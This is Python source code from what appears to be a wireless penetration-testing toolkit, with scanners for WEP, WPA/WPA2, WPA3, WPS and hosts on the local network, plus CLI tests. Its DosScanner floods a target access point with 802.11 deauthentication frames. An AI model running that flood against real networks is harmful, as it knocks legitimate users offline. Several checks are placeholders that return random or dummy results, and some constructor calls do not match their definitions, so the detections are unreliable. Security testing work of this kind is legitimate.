    def finalize(self):
        """
        Finalizes the authentication bypass scan and performs cleanup.
        """
        self.logger.info("Finalizing Authentication Bypass Scan...")
        # Perform any cleanup or finalization steps
        pass


# scanners/base_scanner.py
# scanners/base_scanner.py

import logging

class BaseScanner:
    def __init__(self, core_framework, scan_duration: int = 10):
        """
        Initialize the BaseScanner with core framework and scan duration.

        Args:
            core_framework (CoreFramework): Instance of CoreFramework.
            scan_duration (int): Duration to run the scan in seconds.
        """
        self.core_framework = core_framework
        self.scan_duration = scan_duration
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"{self.__class__.__name__} initialized with scan duration: {self.scan_duration} seconds.")

    def scan(self, target_info: dict) -> dict:
        """
        Perform the scan on the target.

        Args:
            target_info (dict): Information about the target.

        Returns:
            dict: Detected vulnerabilities.
        """
        self.logger.info(f"Scanning target: {target_info}")
        # Placeholder for scan logic
        vulnerabilities = {}
        return vulnerabilities


# scanners/dos_scanner.py
# scanners/dos_scanner.py

import time
from random import random
from threading import Thread, Event
from typing import Dict, Any, Optional

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from scanners.base_scanner import BaseScanner


class DosScanner(BaseScanner):
    def __init__(
        self,
        core_framework,
        vulnerability_db: Dict[str, Any],
        gui_update_callback: Optional[Any] = None
    ):
        """
        Initialize the DosScanner with CoreFramework, vulnerability database, and GUI callback.

        Args:
            core_framework (CoreFramework): An instance of CoreFramework.
            vulnerability_db (Dict[str, Any]): The vulnerability database.
            gui_update_callback (Optional[Any], optional): Callback function to update the GUI. Defaults to None.
        """
        super().__init__(core_framework, vulnerability_db)
        self.detected_vulnerabilities = []
        self.gui_update_callback = gui_update_callback  # Callback to update GUI
        self.stop_monitoring_event = Event()
        self.logger = self.core_framework.logger.getChild(self.__class__.__name__)
        self.logger.info("DosScanner initialized.")

    def scan(self, target: Dict[str, Any]):
        """
        Scans the target network for Denial-of-Service vulnerabilities by sending deauthentication frames.

        Args:
            target (Dict[str, Any]): Information about the target device.
        """
        self.logger.info(f"Starting DoS Scan on target: {target}")

        bssid = target.get('bssid')
        if not bssid:
            self.logger.error("Target BSSID not specified.")
            self.update_feedback("Target BSSID not specified for DoS scan.")
            return

        # Start monitoring the network stability in a separate thread
        monitor_thread = Thread(target=self.monitor_network_stability, args=(bssid,), daemon=True)
        monitor_thread.start()

        # Start DoS attack: flood deauthentication frames
        self.logger.info(f"Sending deauthentication frames to BSSID: {bssid} to test DoS vulnerability.")
        deauth_pkt = RadioTap() / Dot11(
            addr1='FF:FF:FF:FF:FF:FF',
            addr2=self.core_framework.network_manager.get_interface_mac(),
            addr3=bssid
        ) / Dot11Deauth(reason=7)

        attack_duration = 10  # seconds

        # Start sending packets in a separate thread to avoid blocking
        attack_thread = Thread(
            target=self.core_framework.send_continuous_packets,
            args=(deauth_pkt, 0.05),
            daemon=True
        )
        attack_thread.start()

        self.logger.info(f"Running DoS attack for {attack_duration} seconds...")
        self.update_feedback(f"DoS attack initiated on BSSID {bssid}.")

        time.sleep(attack_duration)

        # Stop the attack and monitoring
        self.core_framework.stop_continuous_packets()
        self.stop_monitoring_event.set()  # Signal the monitoring thread to stop
        monitor_thread.join()

        # Evaluate results and check if vulnerability was detected
        if 'DOS_VULNERABILITY' in self.vulnerability_db:
            vulnerability = {
                'type': 'Denial-of-Service',
                'description': 'The network is susceptible to DoS attacks via deauthentication frame flooding.',
                'bssid': bssid,
                'action': 'Implement measures to mitigate DoS attacks, such as client-side protections.'
            }
            self.detected_vulnerabilities.append(vulnerability)
            self.logger.warning(f"Denial-of-Service Vulnerability Detected: {vulnerability}")
            # Optional: Update GUI to show detected vulnerability
            if self.gui_update_callback:
                self.gui_update_callback(f"DoS Vulnerability Detected on BSSID: {bssid}")

    def monitor_network_stability(self, bssid: str):
        """
        Monitors network stability during the DoS attack to detect disruptions.
        Sends feedback to GUI and logs potential vulnerabilities.

        Args:
            bssid (str): The BSSID of the target device.
        """
        self.logger.info(f"Monitoring network stability for BSSID: {bssid}...")
        while not self.stop_monitoring_event.is_set():
            # Check if target is reachable (e.g., simulate ping or connectivity check)
            target_reachable = self.is_target_reachable(bssid)

            if target_reachable:
                status = f"Target BSSID {bssid} is stable."
            else:
                status = f"Disruption detected on BSSID {bssid} (possible DoS)."
                self.logger.warning(status)

            # Update GUI with real-time feedback
            if self.gui_update_callback:
                self.gui_update_callback(status)

            time.sleep(1)  # Adjust interval for monitoring frequency

    def is_target_reachable(self, bssid: str) -> bool:
        """
        Placeholder for checking if target is reachable (connectivity check).
        In a real implementation, this might involve ARP requests or ping-like tests.

        Args:
            bssid (str): The BSSID of the target device.

        Returns:
            bool: True if reachable, False otherwise.
        """
        # Replace with actual connectivity check logic
        # For demonstration, we'll simulate random connectivity status
        return random() > 0.5

    def update_feedback(self, message: str):
        """
        Updates the GUI with feedback messages.

        Args:
            message (str): The message to display.
        """
        if self.gui_update_callback:
            self.gui_update_callback(message)


# scanners/encryption_scanner.py
# wireless_pen_test_lib/scanners/encryption_scanner.py

import time
from .base_scanner import BaseScanner
import logging


class EncryptionWeaknessScanner(BaseScanner):
    def __init__(self, scan_duration: int = 15):
        """
        Initialize the EncryptionWeaknessScanner with a scan duration.

        Args:
            scan_duration (int): Duration to run the scan in seconds.
        """
        super().__init__(scan_duration)
        self.detected_vulnerabilities = []

    def scan(self, target_info: dict) -> dict:
        """
        Perform the encryption weakness scan on the target.

        Args:
            target_info (dict): Information about the target.

        Returns:
            dict: Detected vulnerabilities.
        """
        self.logger.info(f"Starting Encryption Weakness Scan on target: {target_info}")
        time.sleep(self.scan_duration)  # Simulate scanning duration
        # Placeholder for actual scanning logic
        vulnerability = {
            "ssid": target_info.get('ssid', 'N/A'),
            "bssid": target_info.get('bssid', 'N/A'),
            "protocol": "WEP",
            "description": "Weak encryption detected.",
            "action": "Upgrade to WPA2."
        }
        self.detected_vulnerabilities.append(vulnerability)
        self.logger.info("Encryption Weakness Scan completed.")
        return {"scans": {"encryption_scanner": self.detected_vulnerabilities}}

# scanners/local_scanner.py
# scanners/local_scanner.py

import subprocess
import netifaces
import logging
import os
import platform
from typing import List, Optional, Dict, Any
import pandas as pd
import ipaddress
import socket
from scapy.all import srp, conf
from scapy.layers.l2 import ARP, Ether

class LocalScanner:
    def __init__(self, core_framework, interface: str):
        """
        Initialize the LocalScanner with the CoreFramework instance and network interface.

        Args:
            core_framework (CoreFramework): An instance of CoreFramework.
            interface (str): The network interface to scan.
        """
        self.core_framework = core_framework
        self.interface = interface
        self.logger = self.core_framework.logger.getChild(self.__class__.__name__)
        self.os_type = platform.system()
        self.logger.debug(f"Operating System detected: {self.os_type}")

    def is_wireless_interface(self) -> bool:
        """
        Determine if the interface is wireless.

        Returns:
            bool: True if wireless, False otherwise.
        """
        try:
            if self.os_type == "Linux":
                wireless_path = f"/sys/class/net/{self.interface}/wireless"
                is_wireless = os.path.exists(wireless_path)
                self.logger.debug(f"Wireless path {wireless_path} exists: {is_wireless}")
                return is_wireless
            elif self.os_type == "Darwin":  # macOS
                result = subprocess.run(
                    ["networksetup", "-listallhardwareports"],
                    capture_output=True, text=True, check=True
                )
                interfaces = result.stdout.split("\n\n")
                for iface in interfaces:
                    if f"Device: {self.interface}" in iface:
                        if "Wi-Fi" in iface or "AirPort" in iface:
                            self.logger.debug(f"Interface {self.interface} is wireless on macOS.")
                            return True
                self.logger.debug(f"Interface {self.interface} is not wireless on macOS.")
                return False
            elif self.os_type == "Windows":
                # WSL2 is running Linux; wireless interface detection not applicable
                self.logger.debug("Windows interface check called from WSL2; returning False.")
                return False
            else:
                self.logger.warning(f"Unsupported OS for wireless check: {self.os_type}")
                return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error checking wireless interface: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Unexpected error in is_wireless_interface: {e}")
            return False

    def set_monitor_mode(self):
        """
        Set the interface to monitor mode if it's wireless.
        """
        if self.is_loopback_interface():
            self.logger.info("Loopback interface detected. Skipping monitor mode setup.")
            return

        if not self.is_wireless_interface():
            self.logger.info(f"Interface '{self.interface}' is not a wireless interface. Skipping monitor mode setup.")
            return

        try:
            if self.os_type == "Linux":
                self.logger.info(f"Setting interface {self.interface} to monitor mode on Linux.")
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
                subprocess.run(["sudo", "iwconfig", self.interface, "mode", "monitor"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
                self.logger.info(f"Interface {self.interface} set to monitor mode successfully on Linux.")
            elif self.os_type == "Darwin":
                self.logger.info(f"Setting interface {self.interface} to monitor mode on macOS.")
                # macOS uses different commands, such as `airport`
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return
                subprocess.run(["sudo", airport_path, "--disassociate"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
                # macOS does not support monitor mode in the same way as Linux
                self.logger.warning("Monitor mode setup on macOS might require additional steps.")
            else:
                self.logger.warning(f"Monitor mode setup not supported on OS: {self.os_type}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            raise e
        except Exception as e:
            self.logger.error(f"Unexpected error in set_monitor_mode: {e}")
            raise e

    def bring_interface_up(self):
        """
        Bring the network interface up.
        """
        try:
            self.logger.info(f"Bringing interface {self.interface} up.")
            if self.os_type == "Windows":
                subprocess.run(["netsh", "interface", "set", "interface", self.interface, "enabled"], check=True)
            else:
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} is up.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to bring interface up: {e}")
            raise e

    def bring_interface_down(self):
        """
        Bring the network interface down.
        """
        try:
            self.logger.info(f"Bringing interface {self.interface} down.")
            if self.os_type == "Windows":
                subprocess.run(["netsh", "interface", "set", "interface", self.interface, "disabled"], check=True)
            else:
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            self.logger.info(f"Interface {self.interface} is down.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to bring interface down: {e}")
            raise e

    def get_interface_details(self) -> Optional[List[Dict[str, Any]]]:
        """
        Retrieve details about the network interface.

        Returns:
            Optional[List[Dict[str, Any]]]: List of interface details or None if an error occurs.
        """
        try:
            addrs = netifaces.ifaddresses(self.interface)
            details = []
            for family, addr_info_list in addrs.items():
                for addr_info in addr_info_list:
                    entry = {
                        'Family': netifaces.address_families.get(family, family),
                        'Address': addr_info.get('addr', '')
                    }
                    details.append(entry)
            # Append wireless status
            details.append({'Family': 'Wireless', 'Address': self.is_wireless_interface()})
            self.logger.debug(f"Interface details for {self.interface}: {details}")
            return details
        except ValueError:
            self.logger.error(f"Interface {self.interface} not found.")
            return None
        except Exception as e:
            self.logger.error(f"Error retrieving interface details: {e}")
            return None

    def is_loopback_interface(self) -> bool:
        """
        Determine if the interface is a loopback interface.

        Returns:
            bool: True if loopback, False otherwise.
        """
        try:
            details = netifaces.ifaddresses(self.interface)
            # Check for loopback by examining the addresses
            for family in (netifaces.AF_INET, netifaces.AF_INET6):
                if family in details:
                    for addr_info in details[family]:
                        if addr_info.get('addr') in ('127.0.0.1', '::1'):
                            self.logger.debug(f"Interface {self.interface} is a loopback interface.")
                            return True
            self.logger.debug(f"Interface {self.interface} is not a loopback interface.")
            return False
        except ValueError:
            self.logger.error(f"Interface {self.interface} not found.")
            return False
        except Exception as e:
            self.logger.error(f"Error determining if interface is loopback: {e}")
            return False

    @staticmethod
    def list_interfaces() -> List[str]:
        """
        List all available network interfaces.

        Returns:
            List[str]: List of interface names.
        """
        try:
            interfaces = netifaces.interfaces()
            logging.getLogger("LocalScanner").debug(f"Available interfaces: {interfaces}")
            return interfaces
        except Exception as e:
            logging.getLogger("LocalScanner").error(f"Error listing interfaces: {e}")
            return []

    def scan(self) -> Dict[str, Any]:
        """
        Scan the local network for devices.

        Returns:
            Dict[str, Any]: Dictionary containing the list of detected devices.
        """
        self.logger.info("Starting local network scan for devices...")

        # Determine network range
        try:
            addrs = netifaces.ifaddresses(self.interface)
            inet_info = addrs.get(netifaces.AF_INET)
            if not inet_info:
                self.logger.error(f"No IPv4 address found for interface {self.interface}.")
                return {"devices": []}

            ip_address = inet_info[0].get('addr')
            netmask = inet_info[0].get('netmask')
            if not ip_address or not netmask:
                self.logger.error(f"IP address or netmask not found for interface {self.interface}.")
                return {"devices": []}

            # Calculate network
            network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)
            self.logger.debug(f"Calculated network range: {network}")
        except Exception as e:
            self.logger.error(f"Error determining network range: {e}")
            return {"devices": []}

        # Perform ARP scan using Scapy
        try:
            # Create ARP request
            arp = ARP(pdst=str(network))
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            self.logger.info(f"Sending ARP requests to {network}...")
            # Disable verbose in Scapy
            conf.verb = 0
            answered, unanswered = srp(packet, timeout=2, iface=self.interface, inter=0.1)

            devices = []
            for sent, received in answered:
                device = {
                    "ip": received.psrc,
                    "mac": received.hwsrc,
                    "hostname": self.get_hostname(received.psrc),
                    "ssid": self.get_ssid(),
                    "bssid": self.get_bssid()
                }
                devices.append(device)
                self.logger.debug(f"Discovered device: {device}")

            self.logger.info(f"ARP scan completed. {len(devices)} devices found.")
            return {"devices": devices}
        except PermissionError:
            self.logger.error("Permission denied: ARP scan requires elevated privileges.")
            return {"devices": []}
        except Exception as e:
            self.logger.error(f"Error during ARP scan: {e}")
            return {"devices": []}

    def get_hostname(self, ip: str) -> str:
        """
        Perform reverse DNS lookup to get the hostname of an IP address.

        Args:
            ip (str): The IP address.

        Returns:
            str: The hostname or "N/A" if not found.
        """
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            self.logger.debug(f"Hostname for IP {ip}: {hostname}")
            return hostname
        except socket.herror:
            self.logger.debug(f"Hostname not found for IP {ip}.")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Error performing reverse DNS for IP {ip}: {e}")
            return "N/A"

    def get_ssid(self) -> str:
        """
        Retrieve the SSID of the wireless network.

        Returns:
            str: The SSID or "N/A" if not applicable.
        """
        if not self.is_wireless_interface():
            return "N/A"

        try:
            if self.os_type == "Linux":
                result = subprocess.run(
                    ["iwgetid", "-r"],
                    capture_output=True, text=True, check=True
                )
                ssid = result.stdout.strip()
                self.logger.debug(f"Retrieved SSID on Linux: {ssid}")
                return ssid if ssid else "N/A"
            elif self.os_type == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return "N/A"
                result = subprocess.run(
                    [airport_path, "-I"],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if " SSID:" in line:
                        ssid = line.split("SSID:")[1].strip()
                        self.logger.debug(f"Retrieved SSID on macOS: {ssid}")
                        return ssid if ssid else "N/A"
                self.logger.debug("SSID not found in airport output on macOS.")
                return "N/A"
            else:
                self.logger.warning(f"SSID retrieval not supported on OS: {self.os_type}")
                return "N/A"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error retrieving SSID: {e}")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Unexpected error retrieving SSID: {e}")
            return "N/A"

    def get_bssid(self) -> str:
        """
        Retrieve the BSSID of the wireless network.

        Returns:
            str: The BSSID or "N/A" if not applicable.
        """
        if not self.is_wireless_interface():
            return "N/A"

        try:
            if self.os_type == "Linux":
                result = subprocess.run(
                    ["iwconfig", self.interface],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if "Access Point:" in line:
                        bssid = line.split("Access Point:")[1].strip()
                        self.logger.debug(f"Retrieved BSSID on Linux: {bssid}")
                        return bssid if bssid else "N/A"
                self.logger.debug("BSSID not found in iwconfig output on Linux.")
                return "N/A"
            elif self.os_type == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return "N/A"
                result = subprocess.run(
                    [airport_path, "-I"],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if " BSSID:" in line:
                        bssid = line.split("BSSID:")[1].strip()
                        self.logger.debug(f"Retrieved BSSID on macOS: {bssid}")
                        return bssid if bssid else "N/A"
                self.logger.debug("BSSID not found in airport output on macOS.")
                return "N/A"
            else:
                self.logger.warning(f"BSSID retrieval not supported on OS: {self.os_type}")
                return "N/A"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error retrieving BSSID: {e}")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Unexpected error retrieving BSSID: {e}")
            return "N/A"




def main():
    # Configure logging
    logging.basicConfig(level=logging.DEBUG, format='%(levelname)s:%(name)s:%(message)s')
    logger = logging.getLogger("LocalScanner")

    # List available interfaces
    available_interfaces = LocalScanner.list_interfaces()

    if not available_interfaces:
        print("No network interfaces found.")
        return

    # Create a DataFrame for available interfaces
    interfaces_df = pd.DataFrame({
        'Index': range(1, len(available_interfaces) + 1),
        'Interface Name': available_interfaces
    })

    print("Available Network Interfaces:")
    print(interfaces_df.to_string(index=False))

    # Prompt the user to select an interface
    try:
        selected_idx = int(input(f"\nSelect an interface [1-{len(available_interfaces)}]: "))
        if not 1 <= selected_idx <= len(available_interfaces):
            raise ValueError
        selected_interface = available_interfaces[selected_idx - 1]
    except ValueError:
        print("Invalid selection. Please enter a valid number corresponding to the listed interfaces.")
        return

    # Initialize the LocalScanner with the selected interface
    scanner = LocalScanner(core_framework=None, interface=selected_interface)  # Replace 'None' with actual CoreFramework instance

    # Attempt to set monitor mode
    scanner.set_monitor_mode()

    # Retrieve and display interface details
    details = scanner.get_interface_details()
    if details is None:
        print("Failed to retrieve interface details.")
        return

    # Convert details to DataFrame
    details_df = pd.DataFrame(details)

    print("\nInterface Details:")
    print(details_df.to_string(index=False))


if __name__ == "__main__":
    main()


# scanners/wep_scanner.py
# scanners/wep_scanner.py

from scapy.all import sniff, hexdump
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import sys
import time
from .base_scanner import BaseScanner



class WEPScanner(BaseScanner):
    def __init__(self, core_framework, scan_duration: int = 10):
        super().__init__(core_framework, scan_duration)
        self.logger = core_framework.logger.getChild(self.__class__.__name__)
        self.network_manager = core_framework.network_manager

    def scan(self, core_framework, target_info=None, stop_event=None):
        """
        Scan for WEP networks and assess key strength.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WEP networks with their details.
            :param stop_event:
            :param target_info:
            :param core_framework:
        """
        self.logger.info("Starting WEP scan...")
        detected_wep_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                if "WEP" in security:
                    if bssid not in detected_wep_networks:
                        detected_wep_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "Key_Strength": self.assess_key_strength(pkt)
                        }
                        self.logger.info(f"Detected WEP Network: SSID='{ssid}', BSSID={bssid}")
                        if self.gui_update_callback:
                            self.gui_update_callback(f"Detected WEP Network: SSID='{ssid}', BSSID={bssid}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": "eth0",
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WEP scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WEP scan: {e}")

        self.logger.info("WEP scan completed.")
        return {"wep_networks": detected_wep_networks}

    def assess_key_strength(self, pkt):
        """
        Assess the strength of the WEP key based on IV reuse.

        Args:
            pkt: The captured packet.

        Returns:
            str: Assessment of key strength.
        """
        # Placeholder for key strength assessment logic
        # Implement actual analysis based on IV patterns and other factors
        # For demonstration, we'll return a dummy value
        return "Unknown"

    def gui_update_callback(self, message):
        """
        Update the GUI with the provided message.

        Args:
            message (str): The message to display to the user.
        """
        self.logger.info(f"GUI Update: {message}")
        if self.core_framework.gui:
            self.core_framework.gui.update_feedback(message)
        else:
            print(message)


if __name__ == '__main__':
    # Placeholder for testing WEPScanner
    from core.__init__ import CoreFramework

    core = CoreFramework(modules_path="../core/config/protocols/")
    wep_scanner = WEPScanner(core)
    stop_event = threading.Event()
    scan_results = wep_scanner.scan(core, stop_event=stop_event)
    print(scan_results)
    stop_event.set()
    sys.exit(0)

# scanners/wpa3_scanner.py
# scanners/wpa3_scanner.py

from scapy.all import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import time
from .base_scanner import BaseScanner


class WPA3Scanner(BaseScanner):
    def scan(self, core_framework, target_info=None, scan_duration=10, gui_update_callback=None, stop_event=None):
        """
        Scan for WPA3 networks and assess downgrade attack possibilities.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WPA3 networks with their details.
            :param scan_duration:
            :param target_info:
            :param core_framework:
            :param gui_update_callback:
        """
        self.logger.info("Starting WPA3 scan...")
        detected_wpa3_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                # WPA3 networks include 'SAE' in crypto
                if "SAE" in security:
                    if bssid not in detected_wpa3_networks:
                        detected_wpa3_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "Downgrade_Possible": self.assess_downgrade(bssid)
                        }
                        self.logger.info(
                            f"Detected WPA3 Network: SSID='{ssid}', BSSID={bssid}, Downgrade Possible={detected_wpa3_networks[bssid]['Downgrade_Possible']}")
                        if self.gui_update_callback:
                            self.gui_update_callback(
                                f"Detected WPA3 Network: SSID='{ssid}', BSSID={bssid}, Downgrade Possible={detected_wpa3_networks[bssid]['Downgrade_Possible']}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": self.core_framework.network_manager.interface,
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WPA3 scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WPA3 scan: {e}")

        self.logger.info("WPA3 scan completed.")
        return {"wpa3_networks": detected_wpa3_networks}

    def assess_downgrade(self, bssid):
        """
        Assess if the network allows WPA2 downgrades.

        Args:
            bssid (str): The BSSID of the target network.

        Returns:
            str: 'Yes' if downgrade is possible, 'No' otherwise.
        """
        # Placeholder for downgrade assessment logic
        # Implement actual analysis based on information elements in beacon frames
        # For demonstration, we'll return a dummy value
        return "Unknown"


# scanners/wpa_wpa2_scanner.py
# scanners/wpa_wpa2_scanner.py

from scapy.all import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import subprocess
import time
from .base_scanner import BaseScanner


class WPAWPA2Scanner(BaseScanner):
    def scan(self, core_framework, target_info=None, scan_duration=10, gui_update_callback=None, stop_event=None):
        """
        Scan for WPA/WPA2 networks, check for weak PSKs, and detect WPS status.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WPA/WPA2 networks with their details.
            :param stop_event:
            :param gui_update_callback:
            :param target_info:
            :param scan_duration:
            :param core_framework:
        """
        self.logger.info("Starting WPA/WPA2 scan...")
        detected_wpa_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                if "WPA2" in security or "WPA" in security:
                    if bssid not in detected_wpa_networks:
                        detected_wpa_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "WPS_Enabled": self.check_wps(bssid)
                        }
                        self.logger.info(
                            f"Detected WPA/WPA2 Network: SSID='{ssid}', BSSID={bssid}, WPS Enabled={detected_wpa_networks[bssid]['WPS_Enabled']}")
                        if self.gui_update_callback:
                            self.gui_update_callback(
                                f"Detected WPA/WPA2 Network: SSID='{ssid}', BSSID={bssid}, WPS Enabled={detected_wpa_networks[bssid]['WPS_Enabled']}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": self.core_framework.network_manager.interface,
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WPA/WPA2 scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WPA/WPA2 scan: {e}")

        self.logger.info("WPA/WPA2 scan completed.")
        return {"wpa_networks": detected_wpa_networks}

    def check_wps(self, bssid):
        """
        Check if WPS is enabled on the network using 'wash' tool.

        Args:
            bssid (str): The BSSID of the target network.

        Returns:
            str: 'Yes' if WPS is enabled, 'No' otherwise.
        """
        try:
            # Run wash command to check WPS status
            # Ensure 'wash' is installed and available in the system PATH
            result = subprocess.run(['wash', '-i', self.core_framework.network_manager.interface, '-b', bssid],
                                    capture_output=True, text=True, timeout=5)
            if "WPS Enabled" in result.stdout:
                return "Yes"
            else:
                return "No"
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Timeout while checking WPS status for BSSID: {bssid}")
            return "No"
        except FileNotFoundError:
            self.logger.error("The 'wash' tool is not installed or not found in PATH.")
            return "Unknown"
        except Exception as e:
            self.logger.error(f"Error checking WPS status for BSSID {bssid}: {e}")
            return "Unknown"


# scanners/__init__.py
# wireless_pen_test_lib/exploits/__init__.py

# This file can be left empty or used to define the exploits package.


# tests/tests_round_three.py
import unittest
from unittest.mock import patch, MagicMock, ANY
from click.testing import CliRunner
import os
from ui.cli import cli


class TestCLI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.runner = CliRunner()
        cls.sample_target = {
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF'
        }

    @patch('ui.cli.CoreFramework')
    def test_initialize_cli(self, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['--version'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_coreframework.assert_called_once()

    @patch('ui.cli.CoreFramework')
    def test_scan_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.scanners = {'encryption_scanner': MagicMock(), 'dos_scanner': MagicMock()}
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['scan', '-s', 'encryption_scanner', '--target-ssid', 'TestSSID', '--target-bssid', 'AA:BB:CC:DD:EE:FF'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.run_scanner.assert_called_once_with('encryption_scanner', self.sample_target)

    @patch('ui.cli.CoreFramework')
    def test_exploit_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.exploits = {'session_hijacking': MagicMock(), 'credential_extraction': MagicMock()}
        mock_coreframework.return_value = mock_core
        with patch('click.prompt', return_value='mock_value'):
            result = self.runner.invoke(cli, ['exploit', '-e', 'session_hijacking', '--target-ssid', 'TestSSID', '--target-bssid', 'AA:BB:CC:DD:EE:FF'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.run_exploit.assert_called_once_with('session_hijacking', ANY)

    @patch('ui.cli.CoreFramework')
    def test_configure_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['configure', '--set', 'general.interface', 'wlan0mon'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.config_manager.set_config.assert_called_once_with('general.interface', 'wlan0mon')

    @patch('ui.cli.CoreFramework')
    def test_report_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.config_manager.general.report_directory = os.getcwd()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['report', '--format', 'txt'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.finalize.assert_called_once()

    @patch('ui.cli.CoreFramework')
    @patch('subprocess.run')
    def test_test_network_command(self, mock_subprocess, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        mock_subprocess.return_value.stdout = 'Network started successfully'
        result = self.runner.invoke(cli, ['test_network', '--action', 'start'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_subprocess.assert_called_once_with(['python', ANY, 'start'], check=True, capture_output=True, text=True)

if __name__ == '__main__':
    unittest.main()

# tests/tests_round_two.py
# tests/tests_round_two.py

import os
import json
import pytest
import yaml
from click.testing import CliRunner
from pydantic import ValidationError

# Import your modules here
